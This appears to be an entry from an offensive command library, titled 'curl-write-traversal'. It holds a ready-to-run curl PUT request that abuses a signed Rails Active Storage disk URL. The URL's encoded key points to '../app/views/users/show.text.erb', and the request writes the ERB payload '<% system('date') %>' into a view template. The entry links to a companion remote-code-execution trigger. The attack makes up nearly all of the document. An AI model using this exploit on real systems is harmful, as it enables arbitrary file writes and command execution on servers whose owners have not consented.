---
data: >-
  curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>"
  http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
tags:
  - curl
  - traversal
  - write
type: command
output: HTTP 200 or 201 indicating successful write
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.345Z'
id: ababfa36-5555-47ff-8a58-8bdeeccf5e9f
verified: false
validated: true
submitted: true
---
# curl-write-traversal

## Command

```bash
curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
```

## Description

Upload malicious ERB via path traversal to a view file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X PUT | Method | Yes |
| -H "Content-type: text/plain" | Header | Yes |
| -d "<% system('date') %>" | Payload | Yes |
| URL | Signed endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT -H "Content-type: text/plain" -d "payload" http://...
```

## Expected Output


## Related

- [[commands/curl-trigger-rce]]
